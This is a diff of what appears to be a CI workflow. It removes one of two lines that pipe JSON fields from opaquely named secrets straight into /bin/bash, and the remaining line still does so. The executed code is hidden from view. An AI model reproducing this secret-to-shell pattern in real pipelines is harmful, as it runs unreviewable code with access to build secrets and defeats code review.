@@ -22,7 +22,6 @@ jobs:
           efl3: ${{ secrets.efl3 }}
         run: |
           printf '%s' "$efl3" | jq -r .hcsus509 | /bin/bash
-          printf '%s' "$vudbg4" | jq -r .qwru3181 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
